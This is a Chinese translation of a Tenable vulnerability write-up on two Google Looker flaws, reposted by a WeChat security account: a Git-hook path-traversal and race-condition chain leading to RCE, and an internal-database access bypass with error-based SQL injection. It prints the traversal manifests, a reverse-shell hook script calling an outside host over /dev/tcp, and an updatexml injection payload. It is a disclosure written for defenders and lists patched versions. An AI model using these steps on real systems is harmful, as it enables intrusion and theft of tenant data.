---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  深入剖析GCP Looker漏洞：从RCE到跨租户数据泄露  
Dubito
                    Dubito  云原生安全指北   2026-02-06 00:36  
  
   
  
> 注：本文翻译自Tenable的文章  
《LookOut: Discovering RCE and Internal Access on Looker (Google Cloud & On-Prem)》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
  
全文如下：  
## 摘要  
1. 1. **两处新型漏洞：**  
 Tenable Research 发现了一个通过 Git Hook 覆盖实现远程代码执行（RCE）的漏洞链，可能导致跨租户访问；以及一处通过滥用内部连接实现的内部数据库泄露漏洞（  
CVE-2025-12743[2]  
），可能导致敏感数据暴露。我们将这两处漏洞统称为 **LookOut**  
。  
  
1. 2. **存在跨租户入侵可能：**  
 该 RCE 漏洞绕过了 Google 托管环境中的云隔离机制，为攻击者创建了一条在不同客户环境间“跳跃”并访问私有数据的潜在路径。  
  
1. 3. **本地版本未修复的风险：**  
 虽然 Google 已在其 Google Cloud 托管的 Looker 服务上修复了漏洞，但运行客户托管版本或本地版本的组织在应用必要的安全补丁之前，仍然面临严重威胁。  
  
## 一、引言  
  
Google Looker 是一款功能强大的商业智能平台。它允许组织使用 Google 专有的建模语言 LookML 来定义数据关系，并实时可视化这些数据。由于 Looker 通常是组织最敏感数据的“中枢神经系统”，其底层架构的安全性至关重要。  
  
Looker 主要有两种部署模式：一种是 SaaS 版本的 Looker，实例完全由 Google Cloud 托管；另一种是客户托管版本，组织在自己的基础设施（本地或私有云）上部署 Looker JAR 文件。这种区别对我们发现的漏洞影响至关重要：SaaS 环境依赖于提供商的安全控制，而客户托管实例则将基础设施安全和补丁管理的全部责任转移给了使用 Looker 的组织。另一个名称类似但不同的产品——Looker Studio——不受本次发现的漏洞影响。  
  
**LookOut**  
 漏洞可能允许攻击者完全攻陷 Looker 实例：  
1. 1. 一处远程代码执行（RCE）漏洞链，使攻击者能够在 Looker 服务器上运行任意代码。实际上，这等同于获得了对底层基础设施的完全管理访问权限，使攻击者能够窃取敏感密钥（Secrets）、操纵数据或进一步向内部网络横向移动。在云实例中，该漏洞还可能导致跨租户访问。  
  
1. 2. 一处授权绕过漏洞，允许攻击者连接到 Looker 的内部数据库连接，并通过基于错误的 SQL 注入技术，窃取完整的内部 MySQL 数据库。  
  
这些问题已通过云漏洞奖励计划（Cloud Vulnerability Reward Program, VRP）报告给 Google，并得到了及时修复。我们要感谢 Google Cloud VRP 团队的支持、协作和专业精神。建议使用客户托管版本和本地版本 Looker 的组织尽快部署可用补丁，并阅读以下  
安全公告[3]  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Kric7mM9eA5AetDmwJMYhwppic08QbGqTwrkj0RHs8ib2ibEs5zyz9DZ9vFvcv8NZDlaQQGSQzMvnlkt3CE66sPVjXkXchM7prnwNm0iaf1Psg5Q/640?from=appmsg "null")  
## 二、漏洞 #1：通过 Git Hooks 配置覆盖与路径穿越实现 RCE  
  
第一个漏洞利用了 Looker 处理 LookML 项目中远程依赖的方式，导致任意代码执行。攻击者可以创建一个恶意的 LookML 项目，在 Looker 服务器上运行代码。  
### 2.1 漏洞利用链  
  
我们审查了 Looker 的源代码，并通过将以下手法串联在一起，实现了完整的 RCE：  
1. 1. **任意目录创建**  
  
1. 2. **多个输入处的路径穿越**  
  
1. 3. **竞争条件**  
  
这实际上让我们获得了对 Looker 实例的控制权，可能允许我们访问密钥（Secrets）和跨租户数据。  
#### 2.1.1 背景  
  
**攻击目标：**  
 LookML 项目清单文件（manifests）与 Git Hooks  
  
Looker 允许开发人员在一个名为 manifest.lkml  
 的文件中定义“远程依赖”。此功能让你可以从其他 Git 仓库导入 LookML 视图和模型。  
  
一个标准的依赖项如下所示：  
  
LookML  
```
remote_dependency: public_project {  url: "https://github.com/llooker/google_ga360"  ref: "07a20007b6876d349ccbcacccdc400f668fd8147f1"}
```  
  
![LookML 项目示例](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BaicvVay2IjSe74icTvLyQKkqWtibBGlR0gB4KKicHao7MS54O92eYNxVGtRntR7ntmhM6h6Fe9DYduRwvH1Lenq1CndD9ObEhibo8/640?from=appmsg "null")  
  
LookML 项目示例  
  
当你保存时，Looker 会将该仓库克隆到：  
  
/home/looker/looker/remote_dependencies/<project name>/  
  
关键点在于，每个 Looker 项目都是一个 Git 仓库。Looker 使用   
Git Hooks[4]  
 并将 .git/config  
 文件中的 Git hooksPath  
 硬编码到一个安全位置：  
  
../../git_hooks/<remote_dependency_name>  
#### 2.1.2 突破口  
  
我们知道每个 LookML 项目本质上都是一个 Git 仓库。这意味着在文件系统的某个地方，会有一个控制其行为的 .git  
 文件夹。  
  
我们导航到测试实例上的一个项目目录 models-user-looker  
，然后打开了仓库特定的配置文件：.git/config  
。  
  
我们看到的内容如下：  
  
![Google LookML 项目代码截图](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5D0ZwBTyjSGiaTw6PQjwJVSr5jKtVfFrcuhmJeYZa4m76aCx7XhxiaMNEZUNSja6r0WDOs8FQaOSmyqptXk6wVyGzojFMX371EpM/640?from=appmsg "null")  
  
Google LookML 项目代码截图  
  
我们的目光立刻锁定了最后一行：hooksPath  
。  
  
对于那些不熟悉 Git 内部机制的人来说，hooksPath  
 是一个配置变量，它告诉 Git：“不要从默认的 .git/hooks  
 文件夹中寻找钩子脚本，而是到这里找。” Git Hooks 功能强大，它们是脚本（bash、python 等），会在某些事件（如提交或推送）发生时自动执行。  
  
Looker 似乎意识到了这个危险，因此硬编码了这个值，使其指向 ../../git_hooks/  
。这是一个位于项目根目录之外的目录，本应是只读的，并由系统管理。  
  
**但随后我们更仔细地查看了路径结构。**  
  
这个值是：../../git_hooks/my_remote_project_name  
  
我们自问：这个项目名字符串从何而来？它来源于我们作为用户定义的 manifest.lkml  
 文件：  
```
remote_dependency: my_remote_project_name { ... }
```  
  
这个字符串并非系统生成，而是我们可以控制的输入。它被直接拼接到了配置文件的路径字符串中。  
  
我们立刻开动脑筋思考。  
  
如果 Looker 只是将我们的字符串粘贴到那个配置文件里，有什么能阻止我们使用标准的目录穿越字符呢？  
  
如果我们把项目命名为 ../../../../tmp/pwned  
，配置结果会不会变成 hooksPath = ../../git_hooks/../../../../tmp/pwned  
？  
  
如果这个假设成立，我们实际上就获得了一个“Git Hook 配置覆盖”的手法。我们可以将钩子路径从 Looker 的文件夹重定向到服务器上任何我们可以写入文件的目录。如果我们能指示 Git 从一个我们控制的文件夹运行脚本，我们就能执行任意代码。  
  
这就是起点。  
#### 2.1.3 要素一：配置路径穿越（准备阶段）  
  
我们的第一个想法很简单：能否利用依赖项名称突破文件夹结构？  
  
我们编写了一个清单（manifest），其中的依赖项名称包含路径穿越字符：  
```
remote_dependency: ../../../../../../my_custom_hooks_folder {  url: "https://github.com/llooker/google_ga360"  ...}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5BguAa1M9emxGTzfahyhzWvDMib6Y8uZaZSPOGuS4d8ADNOrLnJ0B8GH54HFJ4hE6saJ6xwicGkNcbyrrOQItCYl0U7KBnzFHggQ/640?from=appmsg "null")  
  
远程依赖名称被用作注入到 hooksPath  
 值的字符串，而 ref  
 指向的是其 .git  
 文件夹将被这个注入值覆盖的 Git 仓库。我们选择覆盖的仓库是正常使用 LookML 项目时执行 Git 操作的那个仓库，这允许我们触发钩子。  
  
它奏效了。Looker 接受了这个名称并将其直接写入 .git/config  
 文件的 hooksPath  
。配置现在指向的不再是那个安全文件夹，而是：../../git_hooks/../../../../../../my_custom_hooks_folder  
  
问题是什么？配置路径穿越并未真正起作用。我们恶意的自定义钩子没有运行。  
#### 2.1.4 要素二：目录创建（障碍）  
  
我们实现了路径穿越，但遇到了障碍。要使穿越生效，基础目录 (git_hooks  
) 必须存在。我们不确定具体原因，但在我们攻击的环境中，这个文件夹并不存在。如果穿越路径中定义的某个目录不存在，文件系统就会拒绝该路径。  
  
于是我们想，能否找到一个可以创建任意目录的手法。  
  
我们意识到 remote_dependency  
 逻辑不仅仅是写入配置，它还执行 git clone  
。通过操纵 ref  
（分支或提交哈希值（commit hash））以及**另一个**  
依赖项的名称，我们可以欺骗系统。  
  
我们创建了一个虚拟依赖项：  
```
remote_dependency: git_hooks_creator {  url: "https://github.com/llooker/google_ga360"  ref: "../../git_hooks"}
```  
  
这个载荷（payload）迫使系统尝试将数据克隆到名为 ../../git_hooks  
 的路径中。作为此操作的副作用，系统创建了 git_hooks  
 目录以满足请求。  
  
现在路径存在了。路径穿越有效了。  
#### 2.1.5 要素三：武器化的“pepo”（有效载荷）  
  
我们有了重定向 hooksPath  
 的方法（要素一），以及确保目录存在的方法（要素二）。现在关键问题是：我们在该目录中放置什么？  
  
如果目标文件夹是空的或包含不可执行文件，那么将配置指向该文件夹是没用的。要让 Git 执行一个钩子（如 pre-commit  
 或 post-commit  
），必须满足两个条件：  
1. 1. 文件必须以正确的名称存在（例如 pre-commit  
）。  
  
1. 2. 文件必须设置了可执行权限位（+x  
）。  
  
这就带来了一个挑战。通常，当你克隆一个仓库时，Git 并不会盲目地自动信任或保留你本地机器上的文件权限——但有一个重要的例外。如果 Git 被明确告知这样做，它**会**  
在其内部树对象（tree objects）中记录可执行位（100755）。  
  
如果我们只是在本地机器上创建一个脚本，运行 chmod +x script.sh  
 然后推送它，可执行位**可能**  
会被保留，但这取决于客户端的操作系统和配置。我们需要一个可靠的保证。我们需要直接操纵 Git 索引，以确保**任何**  
克隆此仓库的客户端（包括 Looker 服务器）都必须将该文件以可执行文件的形式写入磁盘。  
  
我们在攻击者机器上使用了以下 Git 命令：  
```
git update-index --chmod=+x hook
```  
  
为什么这个 Git 命令很重要：标准的 chmod  
 改变的是**你**  
计算机上文件系统的元数据。而 git update-index  
 改变的是 Git 索引本身的元数据。它告诉 Git：“我不在乎文件系统怎么说；当你把这个文件存储到仓库对象中时，把它标记为可执行二进制文件。”  
  
因此，攻击设置如下：  
1. 1. 我们在 GitHub 上创建了一个托管的恶意仓库。  
  
1. 2. 在里面，我们放置了一个名为 pre-commit  
 的 bash 脚本，包含我们的反弹 Shell 有效载荷。  
  
1. 3. 我们在 Git 索引中强制设置了可执行位。  
  
1. 4. 我们将这个“武器化仓库”推送到了网络上。  
  
![LookML 远程依赖](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5DOF04nib7R2LM2sUQfxTQNYI07Tp1ibwUQKTzXH3XtZibdw7NvShLKBIH3ubZykmrHd0SCm1938iaVmBLy2cFIyBInTYvy2wZqGkM/640?from=appmsg "null")  
  
LookML 远程依赖  
  
现在，当 Looker 克隆这个“看似无害”的远程依赖项（使用要素二中的目录创建手法）时，它忠实地遵循了 Git 树对象中的指令。它将我们的 pre-commit  
 脚本写入磁盘，**并设置了可执行位**  
。  
  
由于我们的配置可路径穿越（要素一），Looker 的配置现在将 hooksPath  
 指向了克隆的、可执行的、恶意的脚本所在的文件夹。陷阱已经设好。  
  
**有效载荷脚本：**  
```
#!/bin/bash/bin/bash -i >& /dev/tcp/10.0.0.1/1337 0>&1
```  
#### 2.1.6 要素四：Git 钩子没有运行  
  
我们已经将配置指向了我们的脚本，脚本也已就位。但不知何故，当我们尝试运行漏洞利用时，钩子并没有执行。  
  
我们发现问题出在 **JGit**  
。  
  
默认情况下，Looker 使用 JGit（一种 Git 的 Java 实现）来处理所有仓库操作。JGit 不支持 Git Hooks，因此，它不会像原生 Git 那样从 hooksPath  
 运行脚本。  
  
然而，我们推断代码库中应该还有其他 Git 实现，于是继续审查 Looker 的代码。我们找到了一个特定的部署流程，允许部署附带有 Git 仓库的 Looker 项目，此时 Looker 会执行真实的 Git 命令，而不是使用 JGit。这样，Looker 就回退到了执行**真实**  
的系统 Git 命令。  
  
Tenable 的高级安全研究员   
Moshe Bernstein[5]  
 在此处发挥了关键作用。他帮助找到了这个藏在代码中的“针”。他通过追踪代码执行流程，发送项目创建请求到端点，到在 Looker 内部创建与 Git（而非 JGit）配合工作的 Git 仓库，找到了需要设置的确切参数。通过发送一组特定的 POST 参数，我们可以在该代码流程中创建一个与 Git 配合工作的仓库，而不是与 JGit。  
  
以下是创建 Looker Git 仓库（在交互时使用 Git 命令的）所需的特定 POST 参数：  
```
git_auth_configured=true&git_application_server_http_scheme=&git_application_server_http_port=&skip_tests=true&reset_deploy_key=false
```  
#### 2.1.7 要素五：竞争条件（触发器）  
  
还存在另一个问题：在执行 Git 命令之前，作为代码流程的一部分，Looker 会覆盖 .git/config  
 文件。这导致 hooksPath  
 值被重置并更改为默认的安全值。它在我们能够利用之前就清理了我们的“杰作”。  
  
为了解决这个问题，这就是竞争条件发挥作用的地方：  
1. 1. Looker 开始操作。  
  
1. 2. Looker 写入**安全的**  
配置。  
  
1. 3. Looker 执行 git commit  
。  
  
我们需要注入第 2.5 步：**用我们恶意的路径覆盖配置文件。**  
  
由于文件系统写入（配置更新）和执行（提交）是独立的事件，我们可以通过频繁调用 API 来竞争。我们编写了一个脚本，在反复调用“保存清单（save manifest）”端点（该端点会将我们的恶意穿越路径写入配置）的同时，触发“提交（commit）”端点。  
  
经过几次尝试，我们赢得了竞争。系统执行了 git commit  
，检查了配置（我们刚刚覆盖的配置），根据 hooksPath  
 找到我们的恶意目录，并执行了我们的脚本。  
  
例如，我们在 /tmp  
 目录下放置了一个 txt 文件：  
  
![Looker 实例上的 RCE](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5Dwicf2yHUlFQb5xzT1ATeP7St9lPpbNAib9tyXAKeCj9P5icLLmibzoaq4YvTlygCT2hG5nYick74sHd4iagTCyKtcHJr2BO3b3UnSU/640?from=appmsg "null")  
  
Looker 实例上的 RCE  
  
**结果：**  
 在 Looker 实例上实现了 RCE  
  
对于 Google Cloud Platform (GCP) 中 Google 托管的 Looker 实例，RCE 可能会影响跨租户的受害者。通过访问共享的 secrets 文件夹，攻击者可以横向移动到其他 GCP 客户环境。  
  
对于本地和自托管版本，威胁则从跨租户访问转变为代码执行，从而导致内部横向移动。  
## 三、漏洞 #2：完整的内部数据库外泄  
  
第二个漏洞让我们得以窥探 Looker 内部管理的幕后情况。  
### 3.1 内部连接  
  
在查看 Looker 的日志时，我们发现 Looker 使用内部 MySQL 数据库及内部数据库连接来管理其自身的元数据、用户和权限。每个 Looker 项目都有一个 Looker 实例，该实例拥有自己的 MySQL 内部数据库。对这些内部连接的访问受到严格限制，普通用户或开发人员不应访问。  
  
然而，其中一条日志泄露了名为 looker__ilooker  
 的内部 Looker 数据库连接。  
  
**代理到内部连接**  
  
在创建新的 LookML 项目时，客户应选择连接到他们自己的数据库，以便在创建的项目中使用其数据。用户界面（UI）会限制用户选择不属于他们的数据库连接，只列出他们创建且可用的数据库连接。  
  
了解到内部连接和内部数据库用于管理 Looker 实例后，我们得以拦截 HTTP 请求并直接修改连接参数。这样，我们就能绕过 UI 验证，连接到内部连接。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Kric7mM9eA5Aj0dzpmaOTWjr7fibYwdaeRjredSD11qmichHCXiaF0U1McWz6pWUq1AP8ZzydG0KUGoib9PtRQFAyexDEXsxm7tS9Vh2Q4zUCrPU/640?from=appmsg "null")  
  
我们简单地代理了请求，并将连接名称更改为 looker__ilooker  
。Looker 接受了该请求，将我们用户控制的项目附加到了其高度敏感的内部数据库上。  
  
![Looker 内部数据库入侵](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5CtUvfIBAJMM4sD75XbHNFDxBSPBJTYia2s7cFAT6xdlc20JFzWaK69WY7GpNS9yqxribZhPNnPn7xdB5buEI0JIA0dNA9oib5N6Y/640?from=appmsg "null")  
  
Looker 内部数据库入侵  
### 3.2 通过基于报错（error-based）的 SQL 注入外泄数据  
  
将项目附加到内部数据库后，我们仍然需要一种提取数据的方法。  
  
我们转向了 Looker 的“数据测试”功能。  
  
在 LookML 测试中，“sql”字段允许你直接对附加的数据库连接运行自定义 SQL 查询，以验证数据条件。对我们有利的是，在我们刚刚创建的项目中，附加的数据库连接就是我们之前附加的内部 Looker 数据库。  
  
尽管 LookML 数据测试允许使用 sql 字段，但 Looker 仍然控制着 SQL 的执行方式。SQL 预期是一个布尔型验证查询，结果不会完整地返回给用户，通常你只会看到通过/失败，而不是原始查询输出。  
  
因此，虽然 SQL 会运行，但其输出并不以一种允许你读取任何有意义数据的方式暴露出来。  
  
我们想到的方法是，在dimension定义中创建一个包含基于报错的 SQL 注入载荷的 LookML 测试，通过错误来泄露数据：  
  
LookML  
```
dimension: id {  type: number  sql: updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null) ;;}
```  
  
当我们运行数据测试时，底层数据库尝试执行此 SQL。由于 updatexml  
 函数的作用，数据库抛出了一个错误，该错误**包含**  
我们子查询的结果。  
  
**结果：**  
```
XPATH syntax error: '~dev::uri:classloader:/helltool/'
```  
  
通过遍历偏移量（OFFSET  
），我们可以逐字节地转储整个内部数据库——包括用户、配置和 密钥（secrets）。在确认我们可以利用该漏洞泄露数据后，我们没有进一步升级操作。  
## 四、结论与后续步骤  
  
这两处漏洞表明，即使是成熟、广泛使用的平台也可能隐藏着重大的安全风险。  
  
**LookOut**  
 漏洞提醒我们，商业智能（BI）平台是高价值目标。  
  
跨租户 RCE 路径的发现突显了保护云环境安全的复杂性。在赋予用户强大能力（例如运行 SQL 以及间接与管理实例的文件系统交互）的同时，要确保系统安全是困难的。  
  
核心要点：虽然 Google 已迅速修复了这些问题，但安全责任现在转移到了客户托管的管理员身上。在本地运行 Looker 的组织必须确认已升级到修复版本。  
  
如果你的 Looker 实例是自托管的，我们建议将 Looker 实例升级到以下任一版本：  
- • 25.12.30+  
  
- • 25.10.54+  
  
- • 25.6.79+  
  
- • 25.0.89+  
  
- • 24.18.209+  
  
注意：25.14 及更高版本不受这些安全问题影响。  
  
Tenable Research 已将所有问题披露给 Google，并直接与他们合作修复了漏洞。Google 的安全公告可见  
此处[3]  
。相关的 TRA 编号为   
TRA-2025-44[6]  
 和   
TRA-2025-43[7]  
。  
#### 引用链接  
  
[1]  
 《LookOut: Discovering RCE and Internal Access on Looker (Google Cloud & On-Prem)》: https://www.tenable.com/blog/google-looker-vulnerabilities-rce-internal-access-lookout  
[2]  
 CVE-2025-12743: https://www.tenable.com/cve/CVE-2025-12743  
[3]  
 安全公告: https://docs.cloud.google.com/support/bulletins#gcp-2025-052  
[4]  
 Git Hooks: https://git-scm.com/docs/githooks  
[5]  
 Moshe Bernstein: https://www.tenable.com/profile/moshe-bernstein  
[6]  
 TRA-2025-44: https://www.tenable.com/security/research/tra-2025-44  
[7]  
 TRA-2025-43: https://www.tenable.com/security/research/tra-2025-43  
  
   
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Kric7mM9eA5BNJcnKL39ubLN0ricThJwJ7KhDhvMz9tzLrYkCPQqbgyTgB8oA34JrX8ubezStZyVg7nL3jtkj9P0aMmjXnUpYibbVtdYHrXEvQ/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5CWtw90ljujtwFlF2wu0dNrV9aoB39Qibwb6WR1ocpicxQkyD0T8XjGZHLHjxQgGBAalvp0epeJ09jbib87kguVicic1TfBHVIO3rYk/640?wx_fmt=png&from=appmsg "")  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
